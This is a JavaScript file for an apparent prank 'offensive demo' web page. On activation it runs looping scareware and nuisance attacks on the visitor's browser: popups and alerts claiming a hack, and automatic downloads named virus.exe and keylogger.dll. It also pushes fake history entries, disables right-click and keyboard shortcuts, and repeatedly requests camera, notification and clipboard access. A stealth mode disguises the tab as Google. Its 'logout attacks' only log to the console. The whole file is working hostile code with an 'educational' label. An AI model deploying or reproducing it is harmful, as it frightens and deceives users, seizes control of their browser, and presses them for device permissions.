// FOR THE LULZ - Offensive JavaScript Demo
// WARNING: This is for educational/demo purposes only!

let stealthMode = false;
let isActive = false;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log('FOR THE LULZ - Offensive Demo Loaded');
    
    // Button handlers
    const activateBtn = document.getElementById('activateBtn');
    const stealthBtn = document.getElementById('stealthBtn');
    const statusText = document.getElementById('statusText');
    const stealthStatus = document.getElementById('stealthStatus');
    
    if (activateBtn) {
        activateBtn.addEventListener('click', function() {
            if (!isActive) {
                activateOffensiveMode();
                statusText.textContent = 'Status: OFFENSIVE MODE ACTIVE!';
                activateBtn.textContent = 'DEACTIVATE (Refresh to stop)';
                activateBtn.classList.remove('green');
                activateBtn.classList.add('red');
            }
        });
    }
    
    if (stealthBtn) {
        stealthBtn.addEventListener('click', function() {
            toggleStealthMode();
            stealthStatus.textContent = `Stealth: ${stealthMode ? 'ON' : 'OFF'}`;
        });
    }
    
    // Add keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
            toggleStealthMode();
            if (stealthStatus) {
                stealthStatus.textContent = `Stealth: ${stealthMode ? 'ON' : 'OFF'}`;
            }
        }
    });
});

function activateOffensiveMode() {
    if (isActive) return;
    isActive = true;
    console.log('Offensive mode activated!');
    
    // Start various offensive features
    startPopupSpam();
    startFakeDownloads();
    startBrowserManipulation();
    startSpeechSynthesis();
    startPermissionRequests();
    startDeviceVibration();
    startTitleChanges();
    startAlertSpam();
    startVisualAnnoyances();
}

function toggleStealthMode() {
    stealthMode = !stealthMode;
    console.log('Stealth mode:', stealthMode ? 'ON' : 'OFF');
    
    if (stealthMode) {
        document.title = 'Google - Search';
        document.body.style.opacity = '0.1';
    } else {
        document.title = 'FOR THE LULZ - Offensive Demo';
        document.body.style.opacity = '1';
    }
}

// POPUP SPAM
function startPopupSpam() {
    setInterval(() => {
        if (!stealthMode) {
            const popup = window.open('', '_blank', 'width=300,height=200');
            if (popup) {
                popup.document.write(`
                    <html><body style="background:black;color:#00ff00;font-family:monospace;">
                    <h1>YOU'VE BEEN HACKED!</h1>
                    <p>Just kidding... or am I?</p>
                    <script>setTimeout(()=>window.close(),2000);</script>
                    </body></html>
                `);
            }
        }
    }, 3000);
}

// FAKE DOWNLOADS
function startFakeDownloads() {
    setInterval(() => {
        if (!stealthMode) {
            const fakeLinks = [
                'virus.exe', 'malware.zip', 'trojan.bat', 'keylogger.dll'
            ];
            const link = document.createElement('a');
            link.href = 'data:text/plain;base64,' + btoa('This is not a real virus... or is it?');
            link.download = fakeLinks[Math.floor(Math.random() * fakeLinks.length)];
            link.click();
        }
    }, 5000);
}

// BROWSER MANIPULATION
function startBrowserManipulation() {
    // Add fake history entries
    setInterval(() => {
        if (!stealthMode) {
            const fakeUrls = [
                'https://pornhub.com', 'https://virus.com', 'https://hack.me'
            ];
            history.pushState(null, '', fakeUrls[Math.floor(Math.random() * fakeUrls.length)]);
        }
    }, 4000);
    
    // Disable right-click
    document.addEventListener('contextmenu', e => e.preventDefault());
    
    // Disable keyboard shortcuts
    document.addEventListener('keydown', e => {
        if (e.ctrlKey || e.altKey || e.metaKey) {
            e.preventDefault();
        }
    });
}

// SPEECH SYNTHESIS
function startSpeechSynthesis() {
    if ('speechSynthesis' in window) {
        const messages = [
            "You've been hacked!", "Your computer is mine!", "Just kidding...",
            "This is a demo!", "Hope you're having fun!", "Don't worry, it's safe!"
        ];
        
        setInterval(() => {
            if (!stealthMode) {
                const utterance = new SpeechSynthesisUtterance(
                    messages[Math.floor(Math.random() * messages.length)]
                );
                utterance.rate = 0.8;
                utterance.pitch = 1.2;
                speechSynthesis.speak(utterance);
            }
        }, 6000);
    }
}

// PERMISSION REQUESTS
function startPermissionRequests() {
    setInterval(() => {
        if (!stealthMode) {
            // Request camera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({video: true})
                    .then(stream => {
                        console.log('Camera access granted!');
                        stream.getTracks().forEach(track => track.stop());
                    })
                    .catch(err => console.log('Camera access denied'));
            }
            
            // Request notifications
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
            
            // Request clipboard
            if (navigator.clipboard) {
                navigator.clipboard.readText()
                    .then(text => console.log('Clipboard accessed!'))
                    .catch(err => console.log('Clipboard access denied'));
            }
        }
    }, 8000);
}

// DEVICE VIBRATION
function startDeviceVibration() {
    if ('vibrate' in navigator) {
        setInterval(() => {
            if (!stealthMode) {
                navigator.vibrate([200, 100, 200]);
            }
        }, 7000);
    }
}

// TITLE CHANGES
function startTitleChanges() {
    const titles = [
        'YOU\'VE BEEN HACKED!', 'VIRUS DETECTED!', 'SYSTEM COMPROMISED!',
        'FOR THE LULZ', 'DON\'T PANIC!', 'JUST A DEMO!'
    ];
    
    setInterval(() => {
        if (!stealthMode) {
            document.title = titles[Math.floor(Math.random() * titles.length)];
        }
    }, 2000);
}

// ALERT SPAM
function startAlertSpam() {
    setInterval(() => {
        if (!stealthMode) {
            const alerts = [
                'VIRUS DETECTED!', 'SYSTEM COMPROMISED!', 'YOU\'VE BEEN HACKED!',
                'DON\'T PANIC!', 'JUST A DEMO!', 'HAVE FUN!'
            ];
            alert(alerts[Math.floor(Math.random() * alerts.length)]);
        }
    }, 10000);
}

// VISUAL ANNOYANCES
function startVisualAnnoyances() {
    // Random color changes
    setInterval(() => {
        if (!stealthMode) {
            document.body.style.filter = `hue-rotate(${Math.random() * 360}deg)`;
            setTimeout(() => {
                document.body.style.filter = 'none';
            }, 500);
        }
    }, 3000);
    
    // Random mouse cursor changes
    setInterval(() => {
        if (!stealthMode) {
            const cursors = ['crosshair', 'wait', 'grab', 'zoom-in', 'not-allowed'];
            document.body.style.cursor = cursors[Math.floor(Math.random() * cursors.length)];
            setTimeout(() => {
                document.body.style.cursor = 'default';
            }, 1000);
        }
    }, 4000);
    
    // Random element shaking
    setInterval(() => {
        if (!stealthMode) {
            const elements = document.querySelectorAll('h1, .desc, .section');
            const randomElement = elements[Math.floor(Math.random() * elements.length)];
            if (randomElement) {
                randomElement.style.animation = 'shake 0.5s';
                setTimeout(() => {
                    randomElement.style.animation = '';
                }, 500);
            }
        }
    }, 5000);
}

// Add shake animation
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);

// LOGOUT ATTACKS (simulated)
function attemptLogoutAttacks() {
    const sites = [
        'https://google.com', 'https://facebook.com', 'https://twitter.com',
        'https://youtube.com', 'https://reddit.com'
    ];
    
    setInterval(() => {
        if (!stealthMode) {
            const randomSite = sites[Math.floor(Math.random() * sites.length)];
            console.log(`Attempting logout attack on ${randomSite}`);
            // Note: This is just for demo - actual logout attacks require specific implementations
        }
    }, 15000);
}

// Start logout attacks
attemptLogoutAttacks();

console.log('FOR THE LULZ - All offensive features loaded!');

